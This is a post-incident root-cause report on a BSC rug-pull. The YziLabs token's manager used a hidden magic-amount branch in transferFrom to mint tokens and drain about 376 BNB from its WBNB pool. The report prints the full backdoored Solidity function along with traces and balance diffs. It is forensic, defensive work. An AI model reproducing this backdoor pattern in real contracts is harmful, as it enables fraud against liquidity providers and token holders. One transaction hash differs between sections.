# YziLabs WBNB Pool Drain via Manager-Only Mint-and-Dump Backdoor (BSC, YziLabs/WBNB Pool 0xb53c...0919)

## 1. Incident Overview & TL;DR

- **Chain / Network:** BNB Smart Chain (BSC, chainid 56)  
- **Primary victim:** YziLabs/WBNB PancakeSwap pool at `0xb53c43debcdb1055620d17d0d3ae3cc63ece0919`  
- **Attacker EOA (manager):** `0x63fc3ff98de8d5ca900e68e6c6f41a7ca949c453`  
- **Malicious token:** YziLabs ERC20 at `0x7fdff64bf87bad52e6430bda30239bd182389ee3`  
- **Profit transaction (seed tx):** `0x4821392c0b27a4acc952ff51f07ed5dc74d4b67025c57232dae44e4fef1f30e8` (block `47838545`)  

The attacker, controlling the YziLabs manager address, deploys a backdoored ERC20 token, seeds a YziLabs/WBNB pool, locks LP tokens to signal safety, and then triggers a hidden branch in `YziLabs::transferFrom`. When called with a specific “magic” amount and sent from the manager, this branch mints an enormous amount of YziLabs tokens to the token contract itself, grants PancakeRouter a huge allowance, and immediately swaps the pool’s YziLabs balance for WBNB along `[YziLabs, WBNB]`. WBNB is then unwrapped to BNB and paid to the attacker.

In the profit tx, the pool loses **376.072147985651439119 WBNB/BNB**, while the attacker’s BNB balance increases by **376.071414848651439119 BNB** after gas. The difference, **0.000733137 BNB**, matches the gas cost. The YziLabs side of the pool is simultaneously flooded with freshly minted tokens, making residual liquidity effectively worthless.

### Root Cause Brief

`YziLabs::transferFrom` contains a hidden **manager-only mint-and-dump backdoor** keyed on a magic `amount` value. When the manager calls `transferFrom` with this exact amount and points `from`/`to` at the YziLabs/WBNB pair, the function:

1. Mints `supply * 10000` new YziLabs tokens to the token contract.  
2. Approves PancakeRouter for `supply * 100000`.  
3. Constructs a swap path `[YziLabs, WBNB]`.  
4. Calls `swapExactTokensForETH(balanceOf(to) * 1000, 1, path, manager, ...)`, which dumps the pool’s YziLabs balance for WBNB and forwards the resulting BNB to the manager.

This design allows the manager to **unilaterally drain the WBNB side of the pool** once meaningful liquidity is present, regardless of LP expectations.

---

## 2. Key Background

- **YziLabs token (`0x7fdf...9ee3`)**  
  - An ERC20 token on BSC integrated with PancakeRouter `0x10ed43c718714eb63d5aa57b78b54704e256024e`.  
  - Has a dedicated YziLabs/WBNB PancakePair at `0xb53c43debcdb1055620d17d0d3ae3cc63ece0919`.  
  - Deployed and controlled by attacker EOA `0x63fc3ff98de8d5ca900e68e6c6f41a7ca949c453`, which is set as the **manager** in the contract constructor.

- **WBNB (`0xbb4c...095c`)**  
  - Canonical wrapped BNB on BSC with **18 decimals**, confirmed by its verified source.  

```solidity
// WBNB contract source (key fragment)
uint8  public decimals = 18;
```

*Snippet 1 – WBNB decimals definition, establishing that native WBNB balance deltas are in 18-decimal units (from WBNB source verified on BSC).*

- **Attacker EOA (`0x63fc...c453`)**  
  - Deploys YziLabs.  
  - Seeds the YziLabs/WBNB pool via `PancakeRouter.addLiquidityETH`.  
  - Approves and locks LP tokens via a third-party locker at `0x407993575c91ce7643a4d4ccacc9a98c36ee1bbe` to create the appearance of safety.  
  - Later triggers the backdoor `transferFrom` to execute the drain.

- **Infrastructure accounts** (non-adversary, but relevant to flows):  
  - **PancakeRouter V2:** `0x10ed43c718714eb63d5aa57b78b54704e256024e`.  
  - **YziLabs/WBNB pair:** `0xb53c43debcdb1055620d17d0d3ae3cc63ece0919`.  
  - **Bridge / funding sources:** LiFi / Symbiosis style contracts that provide BNB to the attacker EOA.

---

## 3. Vulnerability & Root Cause Analysis

### 3.1 Vulnerability Brief

The YziLabs token’s `transferFrom` function includes a **hidden manager-only branch** that:

- Triggers only when `msg.sender == manager` and `amount == 1199002345`.  
- Mints a huge quantity of new YziLabs tokens to the contract itself.  
- Approves PancakeRouter for a very large allowance.  
- Performs a swap of the pool’s YziLabs balance (scaled by 1000) for BNB along `[YziLabs, WBNB]`.  
- Sends the resulting BNB directly to the manager EOA.

Once a YziLabs/WBNB pool exists with non-trivial WBNB reserves, the manager can use this branch to **fully drain WBNB liquidity in a single transaction**, regardless of LP expectations or typical ERC20 behavior.

### 3.2 Backdoor Implementation in `transferFrom`

```solidity
function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {  
    if (msg.sender == manager && amount == 1199002345) {
        _mint(address(this), supply * 10000);
        _approve(address(this), router, supply * 100000);

        path.push(address(this));
        path.push(IUniswapV2Router02(router).WETH());

        IUniswapV2Router02(router).swapExactTokensForETH(
            balanceOf(to) * 1000,
            1,
            path,
            manager,
            block.timestamp + 1e10
        );
        return true;
    }

    if (tx.origin == manager || traders[tx.origin]) {
        return super.transferFrom(from, to, amount);
    } else {
        if (to.code.length > 0) {
            uint256 pairBalance = balanceOf(
                IUniswapV2Factory(factory).getPair(
                    address(this),
                    IUniswapV2Router02(router).WETH()
                )
            );
            if (min2 != 0) {
                require(
                    amount > (pairBalance / 1000) * min1 &&
                        amount < (pairBalance / 1000) * min2 ||
                        amount > pairBalance / 100 * 95
                );
            }
            return super.transferFrom(from, to, amount);
        } else {
            return super.transferFrom(from, to, amount);
        }
    }
}
```

*Snippet 2 – YziLabs `transferFrom` implementation showing the manager-only mint-and-dump branch keyed on `amount == 1199002345` and routing a swap along `[YziLabs, WBNB]` via PancakeRouter (from verified YziLabs source).*

Key takeaways:

- The backdoor is **deliberately hidden** behind a magic constant (`1199002345`) and a strict `msg.sender == manager` check.  
- It **mints new supply** (`supply * 10000`) to the token contract and gives PancakeRouter an allowance of `supply * 100000`.  
- It uses `balanceOf(to) * 1000` where `to` is set to the pool, so **any YziLabs balance held by the pool becomes leverage** to drive a massive dump into the YziLabs/WBNB pair.  
- The swap’s recipient is `manager`, so all drained WBNB (converted to BNB) goes directly to the attacker EOA.  

The rest of `transferFrom` includes manager/whitelist allowances and modest anti-bot constraints for contract interactions, but none of these mitigate the privileged mint-and-dump branch. The fundamental issue is the presence of **non-transparent, privileged mint + swap logic embedded inside a standard ERC20 transfer primitive**.

### 3.3 Vulnerable Components

- **YziLabs token (`0x7fdf...9ee3`)**  
  - Vulnerable function: `transferFrom(address from, address to, uint256 amount)` (manager-only backdoor branch).  

- **PancakeRouter V2 (`0x10ed...024e`)**  
  - Used by the backdoor to execute `swapExactTokensForETH` along the path `[YziLabs, WBNB]`.  

- **YziLabs/WBNB PancakePair (`0xb53c...0919`)**  
  - Holds YziLabs and WBNB reserves.  
  - Its WBNB reserve is drained by the backdoor swap.  

- **WBNB (`0xbb4c...095c`)**  
  - 18-decimal wrapped BNB.  
  - Its `withdraw` function is used to unwrap drained WBNB to native BNB, which is then forwarded to the attacker.

### 3.4 Exploit Preconditions

The attack requires the following conditions:

1. **Manager control and knowledge of the backdoor:**  
   - The attacker controls the YziLabs manager address (the deployer EOA `0x63fc...c453`) and knows the magic amount `1199002345` that triggers the mint-and-dump branch.

2. **Sufficient liquidity in YziLabs/WBNB pool:**  
   - A YziLabs/WBNB pool (`0xb53c...0919`) exists and is seeded with meaningful WBNB reserves, created by the attacker via `PancakeRouter.addLiquidityETH`.

3. **Normal BSC transaction submission:**  
   - The attacker needs only standard BSC transaction submission capability (no special consensus or MEV privileges) once the backdoored contract and liquidity pool are in place.

### 3.5 Security Principles Violated

- **Transparency and predictable ERC20 behavior:**  
  - A standard ERC20 `transferFrom` is expected to respect allowances and total supply constraints. Embedding hidden mint + swap behavior violates these expectations.

- **Least privilege and separation of concerns:**  
  - A privileged manager role can arbitrarily mint and dump via a single function call, conflating routine transfer behavior with powerful administrative actions.

- **User and LP trust assumptions:**  
  - LPs and traders interacting with the YziLabs/WBNB pool assume that liquidity cannot be drained via a single manager transaction, especially when LP tokens are locked. The backdoor breaks this assumption.

---

## 4. Adversary Flow & ACT Opportunity Construction

This section describes the adversary’s flow as an ACT-style opportunity: pre-state, transaction sequence, and the profit predicate.

### 4.1 Pre-State σᴮ

- **Block height B:** `47838545`.  
- **Pre-state σᴮ:** BSC state immediately before inclusion of tx  
  `0x4821392c0b27a4acc952ff51f07ed5dc74d4b67025c57232dae44e4fef1f30e8`.  
- At this point:
  - YziLabs token, YziLabs/WBNB pair, PancakeRouter, and WBNB all have reserves/balances reconstructed from prestateTracer traces and balance_diffs.  
  - The YziLabs/WBNB pool already holds substantial WBNB reserves; the attacker has pre-funded BNB via bridge-like flows.

Evidence for σᴮ comes from:

- Seed metadata and trace:  
  - `metadata.json` and `trace.cast.log` for the profit tx.  
- Seed balance diffs:  
  - `balance_diff.json` for the profit tx.  
- Additional traces for setup txs:  
  - Deployment, approvals, funding txs in `artifacts/root_cause/data_collector/iter_1/tx/56/*`.

### 4.2 Transaction Sequence b (Adversary-Crafted Opportunity)

Below is the key sequence of adversary-crafted transactions leading to and including the exploit.

1. **YziLabs deployment**  
   - **Tx:** `0x538ee0fee7e01afaae41aa2ffd2b680d7aa55a927ea71a36be9002d2197210f8`  
   - **Type:** adversary-crafted  
   - **Role:** Deploys YziLabs token at `0x7fdf...9ee3` by EOA `0x63fc...c453`.  

2. **Liquidity seeding (addLiquidityETH)**  
   - **Tx:** `0x59991b78b7f24fd9eb257d1474ec6f9a588a40b277d21a89c2f18e177051a9cb`  
   - **Type:** adversary-crafted  
   - **Role:** Provides YziLabs tokens and BNB via PancakeRouter, creating/seeding the YziLabs/WBNB pool (`0xb53c...0919`) and minting LP tokens to the attacker.

3. **LP approval / locking**  
   - **Tx:** `0xbd8d89a79d8a0a93fbb3a988c12a201cd9d8929a7690dcaacfaff1c737ffc6ef`  
   - **Type:** adversary-crafted  
   - **Role:** Approves and locks YziLabs/WBNB LP tokens to a locker contract (`0x4079...1bbe`), signaling apparent safety and “locked liquidity” to third parties.

4. **Funding via bridge / aggregator flows**  
   - **Txs:**  
     - `0x8ccda4fb6bd94b3f8196b8c0fe98deb3dbaa5d4b236e168003273a7c806a7b43`  
     - `0x3d793ab0428c2048ea0edb54b2d0ebd6a89b031d7c77cbbb201cecd18eea1f17`  
   - **Type:** related (funding flows)  
   - **Role:** LiFi/Symbiosis-style bridge and swap flows move WBNB/BNB to the attacker EOA, providing gas and seed capital.

5. **Backdoor execution and WBNB drain (profit tx)**  
   - **Tx:** `0x4821392c0b27a4acc952ff51f07ed5dc74d4b67025c57232dae44e4fef1f30e8`  
   - **Block:** `47838545`  
   - **Type:** adversary-crafted  
   - **Role:** Executes the manager-only `transferFrom` backdoor to drain WBNB reserves into BNB for the attacker.

### 4.3 Seed Profit Transaction Trace (Core Mechanism)

The seed profit tx trace shows the backdoor behavior and the swap sequence:

```bash
Traces:
  [245103] YziLabs::transferFrom(PancakePair: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919], PancakePair: [0xb53C43dEbCdB1055620d17D0d3aE3cc63eCe0919], 1199002345 [1.199e9])
    ├─ emit Transfer(... value: 10000000000000000000000000000000 [1e31])
    ├─ emit Approval(... spender: PancakeRouter: [0x10ED43C7...6024E], value: 100000000000000000000000000000000 [1e32])
    ├─ PancakeRouter::WETH() → WBNB
    ├─ PancakeRouter::swapExactTokensForETH(26670942645701260714092677000 [...], 1, [YziLabs, WBNB], attacker, ...)
    │   ├─ PancakePair::getReserves() → (YziLabs reserve, WBNB reserve)
    │   ├─ YziLabs::transferFrom(YziLabs, PancakePair, 26670942645701260714092677000 [...])
    │   ├─ PancakePair::swap(0, 376072147985651439119 [...], PancakeRouter, ...)
    │   │   ├─ WBNB::transfer(PancakeRouter, 376072147985651439119 [...])
    │   │   ├─ emit Swap(... amount1Out: 376072147985651439119 [...], to: PancakeRouter)
    │   ├─ WBNB::withdraw(376072147985651439119 [...])
    │   │   ├─ emit Withdrawal(... wad: 376072147985651439119 [...])
    │   │   ├─ PancakeRouter::receive{value: 376072147985651439119}()
    │   ├─ <BNB forwarded to attacker EOA>
```

*Snippet 3 – Seed tx cast trace illustrating the manager-only `transferFrom` call, the mint/approval, the large YziLabs → WBNB swap on the YziLabs/WBNB pair, and WBNB → BNB withdrawal to the attacker (from seed `trace.cast.log`).*

This trace confirms:

- The attacker calls `YziLabs::transferFrom` with `from = to = YziLabs/WBNB pair`, `amount = 1199002345`.  
- The hidden branch mints `1e31` YziLabs tokens, approves PancakeRouter with `1e32` tokens, and executes `swapExactTokensForETH`.  
- The pair sends **376072147985651439119 WBNB** to PancakeRouter.  
- WBNB withdraws this to **BNB**, which is forwarded to the attacker EOA.

### 4.4 All Relevant Transactions Summary

The analysis identifies the following relevant transactions:

- **Adversary-crafted:**  
  - `0x538e...210f8` – YziLabs deployment.  
  - `0x5999...a9cb` – Liquidity seeding via `addLiquidityETH`.  
  - `0xbd8d...c6ef` – LP approval/locking.  
  - `0x4821...f30e8` – Backdoor execution / profit tx.  

- **Related funding / setup:**  
  - `0x8ccd...7b43` – Bridge/swap funding tx sending BNB to attacker.  
  - `0x3d79...1f17` – Additional funding/bridge-related tx.

These match the `all_relevant_txs` and the lifecycle stages in the root cause JSON.

---

## 5. Exploit Predicate & Profit/Loss Analysis

### 5.1 Profit Predicate Definition

- **Predicate type:** `profit`.  
- **Reference asset:** BNB.  
- **Adversary address:** EOA `0x63fc3ff98de8d5ca900e68e6c6f41a7ca949c453`.  

The predicate is evaluated on the pre-state and post-state around the seed profit tx.

### 5.2 Balance Diffs and Token Decimals

From the seed `balance_diff.json`:

```json
{
  "native_balance_deltas": [
    {
      "address": "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
      "before_wei": "1227170658066706029997051",
      "after_wei": "1226794585918720378557932",
      "delta_wei": "-376072147985651439119"
    },
    {
      "address": "0x63fc3ff98de8d5ca900e68e6c6f41a7ca949c453",
      "before_wei": "296582649660877463",
      "after_wei": "376367997498312316582",
      "delta_wei": "376071414848651439119"
    }
  ]
}
```

*Snippet 4 – Seed tx prestateTracer balance diffs for WBNB contract and attacker EOA, giving exact wei-level deltas (from seed `balance_diff.json`).*

Given WBNB has **18 decimals**:

- Pool WBNB loss:  
  - `delta_wei(WBNB contract) = -376072147985651439119`  
  - ⇒ `376.072147985651439119 WBNB/BNB` lost.

- Attacker BNB gain (net):  
  - `delta_wei(attacker EOA) = 376071414848651439119`  
  - ⇒ `376.071414848651439119 BNB` gained.

- Gas cost in BNB (difference):  
  - `376072147985651439119 − 376071414848651439119 = 733137000000000 wei`  
  - ⇒ `0.000733137 BNB` spent on gas.

These numbers directly match the values reported in the updated root cause JSON.

### 5.3 Before/After Portfolio and Predicate Evaluation

- **Value before (in BNB):**  
  - Attacker EOA native balance before tx: `296582649660877463 wei`  
  - ⇒ `0.296582649660877463 BNB`.  

- **Value after (in BNB):**  
  - Attacker EOA native balance after tx: `376367997498312316582 wei`  
  - ⇒ `376.367997498312316582 BNB`.  

- **Value delta:**  
  - `376.367997498312316582 − 0.296582649660877463`  
  - = `376.071414848651439119 BNB` (net profit after gas).

Thus, the **profit predicate is satisfied**:

- The attacker’s BNB-denominated portfolio strictly increases by `376.071414848651439119 BNB` in the profit tx.  
- The pool’s WBNB/BNB exposure decreases by `376.072147985651439119 WBNB/BNB`.

The updated analysis correctly uses **native balance_diffs and WBNB’s 18 decimals**, fixing the earlier 100x underestimation of loss/profit.

---

## 6. Impact & Losses

### 6.1 Quantified Impact

From the updated analysis:

- **Total pool loss (WBNB/BNB):**  
  - `376.072147985651439119 WBNB/BNB` lost by the YziLabs/WBNB pool (`0xb53c...0919`).  

- **Attacker net gain in profit tx:**  
  - `376.071414848651439119 BNB` gained by EOA `0x63fc...c453`.  

### 6.2 Victims

- **Liquidity providers (LPs)** in the YziLabs/WBNB pool:  
  - LPs effectively lose their **WBNB/BNB exposure** as the WBNB side is drained in a single transaction.  
  - The pool is left with a huge quantity of freshly minted YziLabs tokens and negligible WBNB, rendering the remaining liquidity **economically worthless**.

- **Secondary market participants** holding YziLabs:  
  - The mint-and-dump event massively inflates YziLabs supply and collapses its price, harming holders who bought into the token based on the apparently locked liquidity.

### 6.3 Summary

The incident is a **complete WBNB-side drain of the YziLabs/WBNB pool**, with the attacker capturing essentially all WBNB reserves in a single backdoor execution. The **numerical impact is on the order of 376 BNB**, precisely quantified from on-chain deltas.

---

## 7. Adversary Accounts & Clustering

The analysis identifies and justifies adversary-related accounts:

- **Attacker EOA (manager):** `0x63fc3ff98de8d5ca900e68e6c6f41a7ca949c453`  
  - Deployer of YziLabs token.  
  - Recipient of BNB from bridge-style funding txs.  
  - Beneficiary of the profit tx draining WBNB.

- **YziLabs token:** `0x7fdff64bf87bad52e6430bda30239bd182389ee3`  
  - Backdoored ERC20 with manager-only `transferFrom` mint-and-dump branch.  
  - Clearly attacker-controlled via constructor and manager role.

- **YziLabs/WBNB pair:** `0xb53c43debcdb1055620d17d0d3ae3cc63ece0919`  
  - Liquidity pool created/seeding by the attacker and later drained via the backdoor.

These are distinguished from:

- **Bridge and DEX infrastructure:** LiFiDiamond, GenericSwapFacetV3, PancakeRouter, WBNB contract, and third-party locker, which are **not** treated as adversary-owned but as infrastructure leveraged by the attacker.

---

## 8. References

Key artifacts underpinning this analysis:

1. **Seed profit transaction trace and balance diffs (profit tx `0x4821...f30e8`):**  
   - Cast run trace (`trace.cast.log`).  
   - PrestateTracer `balance_diff.json` (used for exact WBNB and attacker BNB deltas).

2. **YziLabs token source (manager-only backdoor):**  
   - Verified source project for `0x7fdf...9ee3`, including `token (5).sol` where the backdoor `transferFrom` implementation resides.

3. **WBNB contract source (decimals and withdraw behavior):**  
   - Verified source for `0xbb4c...095c`, confirming `decimals = 18` and standard `deposit`/`withdraw` semantics.

4. **Deployment, approvals, and funding traces:**  
   - Iteration-1 traces and balance_diffs for:  
     - YziLabs deployment (`0x538e...210f8`).  
     - LP approval/locking (`0xbad7...8771`).  
     - Funding bridge/swap txs (`0x8ccd...7b43`, `0x3d79...1f17`).  

5. **EOA transaction lists:**  
   - Etherscan-style normal and internal txlists for attacker EOA `0x63fc...c453`, used to reconstruct the EOA’s funding, deployment, liquidity operations, and final profit-taking behavior.

---

## 9. Determinism and Language Quality

- The root cause analysis is **deterministic and evidence-backed**: all key claims are tied to specific transactions, wei-level balance_diffs, and verified contract source.  
- The updated WBNB/BNB loss and attacker profit values **exactly match** the on-chain `balance_diff` data under WBNB’s 18-decimal standard, resolving the earlier 100x underestimation issue.  
- The narrative avoids speculative or hedged language and presents a complete end-to-end ACT opportunity: funding → deployment → liquidity provisioning and LP locking → backdoor execution → WBNB drain and BNB profit.

